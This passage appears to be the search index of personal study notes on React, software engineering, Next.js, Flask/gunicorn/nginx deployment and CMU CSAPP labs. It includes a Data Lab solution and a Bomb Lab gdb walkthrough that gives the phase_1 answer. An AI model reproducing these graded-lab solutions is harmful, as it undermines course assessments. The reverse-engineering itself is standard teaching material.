process, which can help optimize performance by preventing unnecessary updates.</p> <ul> <li>If shouldComponentUpdate() returns true, the component re-renders.</li> <li>If it returns false, the component does not re-render.</li> </ul> <pre><code>import React, { Component } from \"react\";\n\nclass Counter extends Component {\n    constructor() {\n        super();\n        this.state = {\n            count: 0,\n        };\n    }\n\n    shouldComponentUpdate(nextProps, nextState) {\n        if (nextState.count === this.state.count) {\n            return false;\n        }\n        return true;\n    }\n\n    increment = () =&gt; {\n        this.setState({ count: this.state.count + 1 });\n    };\n\n    render() {\n        console.log(\"Counter component re-rendered\");\n        return (\n            &lt;div style={{ textAlign: \"center\" }}&gt;\n                &lt;p&gt;Count: {this.state.count}&lt;/p&gt;\n                &lt;button onClick={this.increment}&gt;Increment&lt;/button&gt;\n            &lt;/div&gt;\n        );\n    }\n}\n\nexport default Counter;\n</code></pre> <ul> <li>The Counter component has a shouldComponentUpdate() method that checks if the count state has changed.</li> <li>If the count is the same as before, the component does not re-render, saving resources.</li> <li>Only when the count changes will the component re-render.</li> </ul>"},{"location":"Full%20Stack/React/#difference","title":"Difference","text":""},{"location":"Full%20Stack/React/#react-render","title":"React render","text":"<p>React renders HTML to the web page by using a function called render(). The purpose of the function is to display the specified HTML code inside the specified HTML element. In the render() method, we can read props and state and return our JSX code to the root component of our app.</p>"},{"location":"Full%20Stack/React/#reactjs-keys","title":"ReactJS Keys","text":"<p>A key serves as a unique identifier in React, helping to track which items in a list have changed, been updated, or removed. It is particularly useful when dynamically creating components or when users modify the list.</p> <pre><code>const numbers = [1, 2, 3, 4, 5];\nconst updatedNums = numbers.map((number, index) =&gt;\n    &lt;li key={index}&gt;\n        {number}\n    &lt;/li&gt;\n);\n</code></pre>"},{"location":"Full%20Stack/React/#data-binding","title":"Data Binding","text":"<p>Data binding is a technique that binds data sources from the provider and consumer together and synchronizes them. In other words, Data Binding means sharing data between components to view and view to component.</p> <ul> <li>Data binding in React can be achieved by using a controlled input.</li> <li>A controlled input is achieved by binding the value to a state variable and an onChange event to change the state as the input value changes.</li> </ul> <p>1 way data binding</p> <pre><code>import React, { useState } from 'react';\n\nfunction comp() {\n    const [count, setCount] = useState(0);\n\n    return (\n        &lt;div&gt;\n            &lt;h1&gt;Count: {count}&lt;/h1&gt;\n            &lt;button onClick={() =&gt; setCount(count + 1)}&gt;Incre&lt;/button&gt;\n        &lt;/div&gt;\n    );\n}\n\nexport default comp;\n</code></pre> <p>2 ways data binding</p> <pre><code>import React, { useState } from 'react';\nimport './App.css';\n\nfunction App() {\n    const [subject, setSubject] = useState(\"\");\n\n    const handleInputChange = (event) =&gt; {\n        setSubject(event.target.value);\n    };\n\n    return (\n        &lt;div className=\"container\"&gt;\n            &lt;h1&gt;Two-Way Data Binding Example&lt;/h1&gt;\n            &lt;div className=\"content\"&gt;\n                &lt;input\n                    type=\"text\"\n                    placeholder=\"Enter a subject...\"\n                    value={subject}\n                    onChange={handleInputChange}  // Update state on change\n                    className=\"input-field\"\n                /&gt;\n                &lt;p&gt;Your selected subject is: &lt;b&gt;{subject || \"___\"}&lt;/b&gt;&lt;/p&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    );\n}\n\nexport default App;\n</code></pre>"},{"location":"Full%20Stack/React/#usecontext","title":"useContext","text":"<p><code>useContext</code> is a React Hook that allows functional components to consume values from a context, without writing deeply nested props (<code>props drilling</code>).</p> <p>In large apps, passing data (like theme, user, language) down multiple component levels via props becomes messy. Context provides a centralized way to share data across the component tree.</p>"},{"location":"Full%20Stack/React/#1-create-context","title":"1. Create Context","text":"<pre><code>import React, { createContext } from 'react';\n\nexport const ThemeContext = createContext('light');\n</code></pre>"},{"location":"Full%20Stack/React/#2-provide-context-value","title":"2. Provide Context Value","text":"<pre><code>import React from 'react';\nimport { ThemeContext } from './ThemeContext';\nimport App from './App';\n\nfunction Root() {\n  return (\n    &lt;ThemeContext.Provider value=\"dark\"&gt;\n      &lt;App /&gt;\n    &lt;/ThemeContext.Provider&gt;\n  );\n}\n</code></pre>"},{"location":"Full%20Stack/React/#3-consume-context-using-usecontext","title":"3. Consume Context using <code>useContext</code>","text":"<pre><code>import React, { useContext } from 'react';\nimport { ThemeContext } from './ThemeContext';\n\nfunction App() {\n  const theme = useContext(ThemeContext);\n  return &lt;div&gt;The current theme is {theme}&lt;/div&gt;;\n}\n</code></pre>"},{"location":"Full%20Stack/React/#summary-table","title":"Summary Table","text":"Feature Description <code>createContext</code> Creates a Context object <code>Provider</code> Supplies the context value <code>useContext</code> Hook to access context inside components"},{"location":"Full%20Stack/React/#best-practices","title":"Best Practices","text":"<ul> <li>Keep context only for global/shared state (e.g., theme, user, auth).</li> <li>Avoid putting frequently changing state (like mouse position) in context \u2014 it causes many re-renders.</li> </ul>"},{"location":"Full%20Stack/Software%20Engineering/","title":"Software Engineering","text":""},{"location":"Full%20Stack/Software%20Engineering/#sdlc-the-software-development-lifecycle","title":"SDLC - The Software Development Lifecycle","text":""},{"location":"Full%20Stack/Software%20Engineering/#software-testing","title":"Software Testing","text":""},{"location":"Full%20Stack/Software%20Engineering/#software-documentation","title":"Software Documentation","text":""},{"location":"Full%20Stack/Software%20Engineering/#phases-in-the-sdlc","title":"Phases in the SDLC","text":""},{"location":"Full%20Stack/Software%20Engineering/#what-is-software-engineering","title":"What is Software Engineering","text":""},{"location":"Full%20Stack/Software%20Engineering/#software-versions","title":"Software Versions","text":""},{"location":"Full%20Stack/Software%20Engineering/#roles-in-software-engineering","title":"Roles in Software Engineering","text":"Role Description Key Responsibilities Project Manager (Waterfall) Oversees the entire project in traditional SDLC Planning, scheduling, budgetingAllocating resourcesExecuting plansFacilitating communication Scrum Master (Agile) Ensures team success and communication in Agile projects Facilitates Agile processesPrioritizes people over processSupports team collaboration Stakeholder End-users, clients, admins, and decision-makers Define requirementsProvide feedbackParticipate in beta and acceptance testing System / Software Architect Designs the technical foundation of the software Define software architectureGuide technical decisionsSupport development phases UX Designer Focuses on user experience and interaction Design intuitive interfacesDefine user interactionsEnsure usability and accessibility Software Developer Writes and maintains the codebase Implement architecture and requirementsCollaborate with UX designBuild functional features Tester / QA Engineer Ensures software quality and correctness Write and run test casesIdentify bugsVerify software meets requirements Site Reliability Engineer (SRE) Bridges development and operations Monitor systemsAutomate infrastructureTroubleshoot and ensure system reliability Product Manager / Owner Owns the product vision and aligns with user needs Understand client/user needsLead development goalsEnsure product delivers stakeholder value Technical Writer Produces documentation for non-technical users Write manuals, guides, reportsCommunicate complex ideas clearlySupport user onboarding and feedback"},{"location":"Full%20Stack/Software%20Engineering/#summary-highlights","title":"Summary &amp; Highlights","text":"<ul> <li>Software engineering is the application of scientific principles to the design and creation of software. </li> <li>Responsibilities of a software engineer include designing, building, and maintaining software systems. </li> <li>Using the SDLC can improve efficiency and reduce risks by: </li> <li>letting team members know what they should be working on and when </li> <li>facilitating communication between the customer, other stakeholders, and the development team </li> <li>letting stakeholders know where they fit into that process and </li> <li>letting cross-domain teams know when they have completed their tasks so development can move to the next phase.\u202f\u202f </li> <li>Common software engineering processes are requirements gathering, design, coding, testing, releasing, and documenting. </li> <li>The requirement gathering process entails identifying stakeholders, establishing goals and objectives, eliciting requirements from the stakeholders, documenting the requirements, analyzing, prioritizing, and confirming the requirements. </li> <li>An SRS is a document that captures the functionalities that the software should perform and also establishes benchmarks or service levels for its performance. </li> <li>A URS is a subset of the SRS that details user specification requirements. </li> <li>The SysRS contains the same information as an SRS, but can also additionally include system capabilities, interfaces, and user characteristics, policy requirements, regulation requirements, personnel requirements, performance requirements, security requirements, and system acceptance criteria. </li> <li>Waterfall, V-shape model, and agile are all different methodologies for implementing the software development life cycle. </li> <li>Functional testing is concerned with inputs and corresponding outputs of the system under test, non-functional testing tests for attributes such as performance, security, scalability, and availability. Whereas regression testing confirms that a recent change to the application, such as a bug fix, does not adversely affect already existing functionality. </li> <li>Types of documentation include requirements, design, technical, quality assurance, and user. </li> <li>There are many different roles involved in a software engineering project. Some of them include project manager or scrum master, stakeholder, system or software architect, UX designer, software developer, tester or QA engineer, site reliability or Ops engineer, product manager or owner, and technical writer or information developer. </li> </ul>"},{"location":"Full%20Stack/Software%20Engineering/#application-development-concepts","title":"Application Development Concepts","text":""},{"location":"Full%20Stack/Software%20Engineering/#squads","title":"Squads","text":"<p>A Squad in Agile is a small, cross-functional, self-organizing team responsible for a specific feature, product, or service. Each squad typically includes developers, testers, designers, and a product owner. Squads work autonomously, follow Agile principles (e.g., Scrum or Kanban), and collaborate closely to deliver end-to-end value.</p> <p>Key points:</p> <ul> <li>6\u201312 members</li> <li>Owns one product or feature area</li> <li>Works like a mini startup</li> <li>Inspired by Spotify\u2019s Agile model</li> <li>Encourages autonomy and accountability</li> </ul>"},{"location":"Full%20Stack/Web%20Notes/","title":"Web Notes:","text":""},{"location":"Full%20Stack/Web%20Notes/#nextjs","title":"Next.JS","text":""},{"location":"Full%20Stack/Web%20Notes/#link","title":"Link","text":"<p><code>&lt;a href&gt;</code>, will always refresh the page</p> <p>so for page rerouting, we can use Link</p> <p></p>"},{"location":"Full%20Stack/Web%20Notes/#layout","title":"Layout","text":"<p>layout is just a wrapper around all pages, it can be nested to the subfolder</p> <p></p>"},{"location":"Full%20Stack/Web%20Notes/#globalcss","title":"Global.css","text":"<p>import in the layout</p>"},{"location":"Full%20Stack/Web%20Notes/#component-folder","title":"Component folder","text":"<p>Add components under App folder structure, no right or wrong inside or outside app folder.</p> <p>I prefer outside</p>"},{"location":"Full%20Stack/Web%20Notes/#reserved-filenames","title":"Reserved Filenames","text":"<p>As you already learned, there are some reserved filenames when working with NextJS.</p> <p>Important: These filenames are only reserved when creating them inside of the <code>app/</code> folder (or any subfolder). Outside of the <code>app/</code> folder, these filenames are not treated in any special way.</p> <p>Here's a list of reserved filenames in NextJS - you'll, of course, learn about the important ones throughout this section:</p> <ul> <li><code>page.js</code> =&gt; Create a new page (e.g., <code>app/about/page.js</code> creates a <code>&lt;your-domain&gt;/about</code> page)</li> <li><code>layout.js</code> =&gt; Create a new layout that wraps sibling and nested pages</li> <li><code>not-found.js</code> =&gt; Fallback page for \"Not Found\" errors (thrown by sibling or nested pages or layouts)</li> <li><code>error.js</code> =&gt; Fallback page for other errors (thrown by sibling pages or nested pages or layouts)</li> <li><code>loading.js</code> =&gt; Fallback page which is shown whilst sibling or nested pages (or layouts) are fetching data</li> <li><code>route.js</code> =&gt; Allows you to create an API route (i.e., a page which does NOT return JSX code but instead data, e.g., in the JSON format)</li> </ul> <p>You also find a list with all supported filenames &amp; detailed explanations in the official docs: https://nextjs.org/docs/app/api-reference/file-conventions</p>"},{"location":"Full%20Stack/nginx/","title":"Linux","text":""},{"location":"Full%20Stack/nginx/#systemdsystem-demon","title":"Systemd(system demon)","text":"<p>Systemd is a service management tool in linux that can be used to create a new service.</p>"},{"location":"Full%20Stack/nginx/#create-http-flask-service","title":"Create Http Flask service","text":"<p>After configure the reverse proxy successful in nginx, we can deploy the python flask application by using gunicorn(https://gunicorn.org/#quickstart) to deploy. Gunicorn 'Green Unicorn' is a Python WSGI HTTP Server for UNIX. </p> <p>Why should I use gunicorn to deploy instead of using python?</p> <p>Create a [name].service file under <code>/etc/systemd/system/</code></p> <p>Example service file for my gunicron application</p> <pre><code>[Unit]\nDescription=Gunicorn instance to serve flask_testing\nAfter=network.target\n\n[Service]\nUser=ubuntu\nGroup=ubuntu\nWorkingDirectory=/home/ubuntu/flask_testing\nEnvironment=\"PATH=/home/ubuntu/flask_testing/flasktestvenv/bin\"\nExecStart=/home/ubuntu/flask_testing/flasktestvenv/bin/gunicorn --workers 2 --bind 0.0.0.0:5000 app:app\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Useful cmd:</p> <pre><code>sudo systemctl daemon-reload    //Reload the systemd manager configuration to make it aware of the new service file:\nsudo systemctl enable gunicorn  //Enable the service to start on boot:\nsudo systemctl start gunicorn   //Start the service:\nsudo systemctl status gunicorn  //Verify that the service is running without errors:\n\nsudo systemctl restart gunicorn\nsudo systemctl stop gunicorn\njournalctl -u gunicorn\n</code></pre> <p>Resources</p>"},{"location":"Full%20Stack/nginx/#https-ssl","title":"HTTPS &amp; SSL","text":"<p>How to auto generate the SSL certificate and set up the ssl in Nginx to make the website use https</p> <p>I find it really easy to configure the SSL by using the certbot by following the below link. I am using AWS EC2 ubuntu instance.</p> <p>https://certbot.eff.org/instructions?ws=nginx&amp;os=ubuntufocal</p> <p>The only change I need to make is </p>"},{"location":"Full%20Stack/nginx/#nginx-cmd","title":"NGINX CMD","text":"<p><code>sudo nginx -t</code> Check the nginx syntax verfication</p> <p><code>sudo systemctl reload nginx</code> </p> <p><code>sudo systemctl restart nginx</code> </p>"},{"location":"Full%20Stack/nginx/#reference","title":"Reference","text":""},{"location":"Full%20Stack/nginx/#why-should-i-use-gunicorn-to-deploy-instead-of-using-python","title":"Why should I use gunicorn to deploy instead of using python?","text":"<ol> <li>Production-Ready: The Flask built-in server is intended for development purposes only. It is not optimized for production use and does not provide the necessary features for handling production traffic efficiently and securely. Gunicorn, on the other hand, is designed for production use and can handle multiple requests concurrently.</li> <li>Concurrency: Gunicorn can manage multiple worker processes. This allows it to handle many requests at the same time, improving the responsiveness and performance of your application. The built-in Flask server is single-threaded and can only handle one request at a time, making it unsuitable for high-traffic applications.</li> <li>Load Balancing: Gunicorn can spawn multiple worker processes, which can be distributed across multiple CPU cores. This makes better use of the server's resources and improves performance. The built-in Flask server does not support multiple workers or load balancing.</li> <li>Graceful Handling of Connections: Gunicorn provides graceful handling of connections and worker processes, ensuring that requests are completed even if a worker process is restarted or shut down. This helps maintain uptime and provides a better experience for users.</li> <li>Security: Gunicorn is more secure for production use as it is designed to handle various security concerns such as handling untrusted client data. The built-in Flask server lacks these production-level security features.</li> <li>Compatibility with WSGI Servers: Gunicorn is a WSGI (Web Server Gateway Interface) HTTP server for Python web applications. It allows your Flask application to be served by any WSGI-compatible web server, providing flexibility and scalability. The built-in Flask server does not support WSGI, limiting its compatibility with other web servers.</li> <li>Integration with Reverse Proxies: Gunicorn works well with reverse proxies like Nginx. Nginx can handle static files, SSL termination, and can act as a load balancer, forwarding requests to Gunicorn. This setup enhances performance and security while providing more robust server management.</li> <li>Reliability and Robustness: Gunicorn has been battle-tested in production environments and is known for its reliability and robustness. It handles edge cases and failures gracefully, ensuring your application remains available.</li> </ol> <p>In summary, while the built-in Flask server is great for development and testing, Gunicorn provides the necessary features, performance, and security required for deploying a Flask application in a production environment.</p>"},{"location":"Systems/CSAPP/","title":"CSAPP - Computer System","text":""},{"location":"Systems/CSAPP/#lab1-data-lab-c-bitwise-operations","title":"Lab1 - Data Lab (C bitwise operations)","text":"<p>How to setup the test environment.</p> <p>How to open VS code on WSL2. -&gt; Open Docker Desktop. On Vs code, type remote container</p>"},{"location":"Systems/CSAPP/#for-lab1-data-lab1","title":"For lab1. Data lab1.","text":"<p>cd ~</p> <p>ls</p> <p>cd csapplab</p> <p>cd datalab/datalab-handout</p> <p>make clean &amp;&amp; make &amp;&amp; ./btest</p> <p>Notes:</p> <p>Q1. BitXor;</p> <p></p> <p>Ideas: First find the OR gate of two inputs, flip them use not then and them. And the initial two inputs and not the output then finally and the two values. </p>"},{"location":"Systems/CSAPP/#floating-point","title":"Floating point:","text":"<p>Will always convert to the form of M = 1.xxx, and M x 2^pow</p>"},{"location":"Systems/CSAPP/#floatfloat2intf","title":"floatFloat2Int(f)","text":"<p>\u5c06\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u6574\u6570</p> <ul> <li>\u4ee3\u7801</li> </ul> <pre><code>/* \n * floatFloat2Int - Return bit-level equivalent of expression (int) f\n *   for floating point argument f.\n *   Argument is passed as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point value.\n *   Anything out of range (including NaN and infinity) should return\n *   0x80000000u.\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nint floatFloat2Int(unsigned uf) {\n  int s_    = uf&gt;&gt;31;\n  int exp_  = ((uf&amp;0x7f800000)&gt;&gt;23)-127;\n  int frac_ = (uf&amp;0x007fffff)|0x00800000;\n  if(!(uf&amp;0x7fffffff)) return 0;\n\n  if(exp_ &gt; 31) return 0x80000000;\n  if(exp_ &lt; 0) return 0;\n\n  if(exp_ &gt; 23) frac_ &lt;&lt;= (exp_-23);\n  else frac_ &gt;&gt;= (23-exp_);\n\n  if(!((frac_&gt;&gt;31)^s_)) return frac_;\n  else if(frac_&gt;&gt;31) return 0x80000000;\n  else return ~frac_+1;\n}\n</code></pre> <ul> <li>\u601d\u8def</li> </ul> <p>\u9996\u5148\u8003\u8651\u7279\u6b8a\u60c5\u51b5\uff1a\u5982\u679c\u539f\u6d6e\u70b9\u503c\u4e3a0\u5219\u8fd4\u56de0\uff1b\u5982\u679c\u771f\u5b9e\u6307\u6570\u5927\u4e8e31\uff08frac\u90e8\u5206\u662f\u5927\u4e8e\u7b49\u4e8e1\u7684\uff0c1&lt;&lt;31\u4f4d\u4f1a\u8986\u76d6\u7b26\u53f7\u4f4d\uff09\uff0c\u8fd4\u56de\u89c4\u5b9a\u7684\u6ea2\u51fa\u503c0x80000000u\uff1b\u5982\u679c \ud835\udc52\ud835\udc65\ud835\udc5d&lt;0 \uff081\u53f3\u79fbx\u4f4d,x&gt;0\uff0c\u7ed3\u679c\u4e3a0\uff09\u5219\u8fd4\u56de0\u3002\u5269\u4e0b\u7684\u60c5\u51b5\uff1a\u9996\u5148\u628a\u5c0f\u6570\u90e8\u5206\uff0823\u4f4d\uff09\u8f6c\u5316\u4e3a\u6574\u6570\uff08\u548c23\u6bd4\u8f83\uff09\uff0c\u7136\u540e\u5224\u65ad\u662f\u5426\u6ea2\u51fa\uff1a\u5982\u679c\u548c\u539f\u7b26\u53f7\u76f8\u540c\u5219\u76f4\u63a5\u8fd4\u56de\uff0c\u5426\u5219\u5982\u679c\u7ed3\u679c\u4e3a\u8d1f\uff08\u539f\u6765\u4e3a\u6b63\uff09\u5219\u6ea2\u51fa\u8fd4\u56de\u8d8a\u754c\u6307\u5b9a\u503c0x80000000u\uff0c\u5426\u5219\u539f\u6765\u4e3a\u8d1f\uff0c\u7ed3\u679c\u4e3a\u6b63\uff0c\u5219\u9700\u8981\u8fd4\u56de\u5176\u8865\u7801\uff08\u76f8\u53cd\u6570\uff09\u3002</p> <p>The idea is to apply the concept that when converting from the binary int to the float format, need to use the normalized encoding idea.</p>"},{"location":"Systems/CSAPP/#takeaway","title":"Takeaway:","text":"<ul> <li> <p>Any arithmetic operations with unsigned values will cast the result to be unsigned.</p> </li> <li> <p>The size_t defined as unsinged value with length = word size, In C++, <code>size_t</code> is a data type used to represent the size of objects. It's an unsigned integer type that's capable of storing the size in bytes of any object. Its actual size can vary depending on the platform and compiler, but it's typically chosen to be large enough to represent the maximum possible size of a theoretically possible object on the given platform. size_t is better than used unsigned_int .</p> </li> <li>Reference https://pvs-studio.com/en/blog/terms/0044/#:~:text=The%20size_t%20is%20chosen%20so,64%2Dbit%20one%2064%20bits.</li> <li>The 2's complement of a value is ~x + 1;</li> </ul>"},{"location":"Systems/CSAPP/#lab2-bomb-labdisassemble-the-object-code-to-reverse-engineering-the-program","title":"Lab2 - Bomb Lab(Disassemble the object code to reverse engineering the program)","text":""},{"location":"Systems/CSAPP/#gdb-debug-tool","title":"GDB Debug tool","text":"<p>To debug, use dgb debugged, the pdf can be found at this link</p> <p>https://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf</p> <p>gdb object code or compiled code <code>gdb bomb</code></p> <p>Inside, running disassmble function <code>disas &lt;function name&gt;</code></p> <p><code>x/s 0x402400</code> x/s will be used to Examine a string stored at 0xbffff890.</p> <p>Write a function in x64</p> <p></p>"},{"location":"Systems/CSAPP/#phase_1","title":"Phase_1","text":"<pre><code>Dump of assembler code for function phase_1:\n   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi\n   0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;\n   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax\n//Expected return eax to be zero to diffuse the bomb\n   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;\n   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp\n   0x0000000000400efb &lt;+27&gt;:    retq   \nEnd of assembler dump.\n\nDump of assembler code for function strings_not_equal:\n   0x0000000000401338 &lt;+0&gt;:     push   %r12\n   0x000000000040133a &lt;+2&gt;:     push   %rbp\n   0x000000000040133b &lt;+3&gt;:     push   %rbx\n   0x000000000040133c &lt;+4&gt;:     mov    %rdi,%rbx\n   0x000000000040133f &lt;+7&gt;:     mov    %rsi,%rbp\n   0x0000000000401342 &lt;+10&gt;:    callq  0x40131b &lt;string_length&gt;\n\n\nDump of assembler code for function string_length:\n   0x000000000040131b &lt;+0&gt;:     cmpb   $0x0,(%rdi)\n   0x000000000040131e &lt;+3&gt;:     je     0x401332 &lt;string_length+23&gt;\n   0x0000000000401320 &lt;+5&gt;:     mov    %rdi,%rdx\n   0x0000000000401323 &lt;+8&gt;:     add    $0x1,%rdx\n\nAddress     Value\n0x1000      'h'\n0x1001      'e'\n0x1002      'l'\n0x1003      'l'\n0x1004      'o'\n0x1005      '\\0' (null terminator)   \n\n   0x0000000000401327 &lt;+12&gt;:    mov    %edx,%eax\n   0x0000000000401329 &lt;+14&gt;:    sub    %edi,%eax\n   0x000000000040132b &lt;+16&gt;:    cmpb   $0x0,(%rdx)\n   0x000000000040132e &lt;+19&gt;:    jne    0x401323 &lt;string_length+8&gt;\n   0x0000000000401330 &lt;+21&gt;:    repz retq \n   0x0000000000401332 &lt;+23&gt;:    mov    $0x0,%eax\n   0x0000000000401337 &lt;+28&gt;:    retq   \nEnd of assembler dump.\n</code></pre> <p>Explain of String_lengh:</p> <p><code>Dump of assembler code for function string_length:    0x000000000040131b &lt;+0&gt;:     cmpb   $0x0,(%rdi)    0x000000000040131e &lt;+3&gt;:     je     0x401332 &lt;string_length+23&gt;    0x0000000000401320 &lt;+5&gt;:     mov    %rdi,%rdx    0x0000000000401323 &lt;+8&gt;:     add    $0x1,%rdx    0x0000000000401327 &lt;+12&gt;:    mov    %edx,%eax    0x0000000000401329 &lt;+14&gt;:    sub    %edi,%eax    0x000000000040132b &lt;+16&gt;:    cmpb   $0x0,(%rdx)    0x000000000040132e &lt;+19&gt;:    jne    0x401323 &lt;string_length+8&gt;    0x0000000000401330 &lt;+21&gt;:    repz retq     0x0000000000401332 &lt;+23&gt;:    mov    $0x0,%eax    0x0000000000401337 &lt;+28&gt;:    retq    End of assembler dump.</code></p> <p>First, compare the first dereference value at rdi, if not zero, go to the next statement, if zero. return 0.</p> <p>Copy the input string rdi to the rdx,</p> <p>Move the pointer one step at rdx,</p> <p>Copy the edx to eax</p> <p>Subtract eax from the original edi, it will perform the address subtracting. First loop should return 1 step,</p> <p>Compare the next pointer address value if it is null with zero. If not, go back to the +8, if yes, it will return the eax reg.</p> <p>This function is used to calcualte the string length.</p> <p></p> <p>In the main code section, the rdi is a  user input,</p> <p>rsi is the direct access of the memory address at 0x402400.</p> <pre><code>Dump of assembler code for function strings_not_equal:\n////what does it do, just compare tow input string, rdi and rsi, return the eax to zero if they are equal else return eax to 1\n\n   0x0000000000401338 &lt;+0&gt;:     push   %r12\n   0x000000000040133a &lt;+2&gt;:     push   %rbp\n   0x000000000040133b &lt;+3&gt;:     push   %rbx\n   0x000000000040133c &lt;+4&gt;:     mov    %rdi,%rbx\n   0x000000000040133f &lt;+7&gt;:     mov    %rsi,%rbp\n   0x0000000000401342 &lt;+10&gt;:    callq  0x40131b &lt;string_length&gt;\n   0x0000000000401347 &lt;+15&gt;:    mov    %eax,%r12d\n   0x000000000040134a &lt;+18&gt;:    mov    %rbp,%rdi\n   0x000000000040134d &lt;+21&gt;:    callq  0x40131b &lt;string_length&gt;\n   0x0000000000401352 &lt;+26&gt;:    mov    $0x1,%edx    \n   0x0000000000401357 &lt;+31&gt;:    cmp    %eax,%r12d   //compare the length of two inputs\n   0x000000000040135a &lt;+34&gt;:    jne    0x40139b &lt;strings_not_equal+99&gt;  //if not same, end, set eax = edx = 0x1\n   0x000000000040135c &lt;+36&gt;:    movzbl (%rbx),%eax\n   //what is movzbl, movz, convert the single byte into 4bytes, 8bit -32bit. and zero extend the eax register\n\nZero-Extension\nZero-Extend: This means that the rest of the EAX register (the upper 24 bits) will be set to zero after the byte is moved.\nExample: If the byte at (%rbx) is 0x41 (which is the ASCII code for 'A'):\nAfter execution, EAX will be 0x00000041.\n\n   0x000000000040135f &lt;+39&gt;:    test   %al,%al\n   //zf set wen a&amp;b == 0, test the rax if the start is null, check the char if it is null, if null then both empty, still same return eax =0\n   0x0000000000401361 &lt;+41&gt;:    je     0x401388 &lt;strings_not_equal+80&gt;\n   0x0000000000401363 &lt;+43&gt;:    cmp    0x0(%rbp),%al\n   0x0000000000401366 &lt;+46&gt;:    je     0x401372 &lt;strings_not_equal+58&gt;\n   0x0000000000401368 &lt;+48&gt;:    jmp    0x40138f &lt;strings_not_equal+87&gt;\n   0x000000000040136a &lt;+50&gt;:    cmp    0x0(%rbp),%al\n   0x000000000040136d &lt;+53&gt;:    nopl   (%rax)\n   0x0000000000401370 &lt;+56&gt;:    jne    0x401396 &lt;strings_not_equal+94&gt;\n   0x0000000000401372 &lt;+58&gt;:    add    $0x1,%rbx\n   0x0000000000401376 &lt;+62&gt;:    add    $0x1,%rbp\n   0x000000000040137a &lt;+66&gt;:    movzbl (%rbx),%eax\n   0x000000000040137d &lt;+69&gt;:    test   %al,%al\n\n   0x000000000040137f &lt;+71&gt;:    jne    0x40136a &lt;strings_not_equal+50&gt;\n   0x0000000000401381 &lt;+73&gt;:    mov    $0x0,%edx\n   0x0000000000401386 &lt;+78&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;\n   0x0000000000401388 &lt;+80&gt;:    mov    $0x0,%edx\n   0x000000000040138d &lt;+85&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;\n   0x000000000040138f &lt;+87&gt;:    mov    $0x1,%edx\n   0x0000000000401394 &lt;+92&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;\n   0x0000000000401396 &lt;+94&gt;:    mov    $0x1,%edx\n   0x000000000040139b &lt;+99&gt;:    mov    %edx,%eax\n   0x000000000040139d &lt;+101&gt;:   pop    %rbx\n   0x000000000040139e &lt;+102&gt;:   pop    %rbp\n   0x000000000040139f &lt;+103&gt;:   pop    %r12\n   0x00000000004013a1 &lt;+105&gt;:   retq   \nEnd of assembler dump.\n</code></pre> <p></p>"},{"location":"Systems/CSAPP/#ans","title":"Ans:","text":"<p>(gdb) x/s 0x402400</p> <p>0x402400:       \"Border relations with Canada have never been better.\"</p> <p>Border relations with Canada have never been better.</p>"},{"location":"Systems/CSAPP/#phase_2","title":"Phase_2","text":"<p>The <code>LEA</code> (Load Effective Address) instruction in x86-64 assembly language is used to perform address calculations and load the result into a register. Unlike other instructions that directly access memory, <code>LEA</code> simply computes an address and stores it in a register without accessing the memory at that address.</p> <p>The purpose of <code>LEA</code> is to allow one to perform a non-trivial address calculation and store the result [for later usage]</p> <p>Lea \u7528\u6765\u8ba1\u7b97\u5730\u5740\uff0c\u503c\u4e0d\u4f1a\u8fdb\u884c\u4f20\u9012</p> <pre><code>assembly\nCopy code\nLEA destination, source\n</code></pre> <ul> <li>destination: A general-purpose register where the result of the address calculation will be stored.</li> <li>source: An effective address expression that typically involves base registers, index registers, scaling factors, and displacement values.</li> </ul> <pre><code>Dump of assembler code for function phase_2:\n   0x0000000000400efc &lt;+0&gt;:     push   %rbp\n   0x0000000000400efd &lt;+1&gt;:     push   %rbx\n   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp\n   //allocate 40bytes to store local variables on stack\n   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi\n\n   // rsi = rsp,\n   0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;\n   {\n   rsi -&gt; rdx\n   0x4 (rsi) -&gt; rcx\n\n   6 overall registers and stack pointer as arguments to read and store the data in rsi = rsp(in phase_2),\n\n   rsi -&gt; rdx first integer -&gt; rax\n0x4(%rsp) =  0x4(%rsi) -&gt; rcx: Address for the second integer. -&gt; 0x4(rax)\n0x14(%rsi) -&gt; rax: Address for the sixth integer. -&gt; + 4\n0x10(%rsi) -&gt; rax: Address for the fifth integer. -&gt; +4\n0xc(%rsi) -&gt; r9: Address for the fourth integer.    -&gt; +4\n\nthe scannf function will get the inputs from rdi, the format of rsi, and store the reading values at register rdx -&gt; stack, which is on rsp. and return rax, how many values read\n   }\n\n\n   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)\n   // rsp 0x0 = 1\n\n   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;\n   0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;\n   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax\n   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax\n   // adding the current one by itself -&gt; 1+1 = 2\n   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)\n   // the second int(0x4 rsp) = 2, do the same until it reaches \n   0x0000000000400f1e &lt;+34&gt;:    je     